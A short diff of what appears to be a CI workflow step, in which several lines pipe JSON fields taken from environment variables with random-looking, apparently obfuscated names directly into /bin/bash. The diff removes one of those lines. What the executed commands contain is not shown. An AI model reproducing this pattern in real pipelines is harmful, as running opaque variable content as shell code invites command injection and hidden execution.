@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$tonu7451" | jq -r .xy746 | /bin/bash
           printf '%s' "$vnxxr402" | jq -r .gb157 | /bin/bash
           echo $yotyw59109 | jq -r .h96 | /bin/bash
-          printf '%s' "$lhwon025" | jq -r .k5676 | /bin/bash
           printf '%s' "$smpj86948" | jq -r .hml5043 | /bin/bash
 
       - name: Archive results
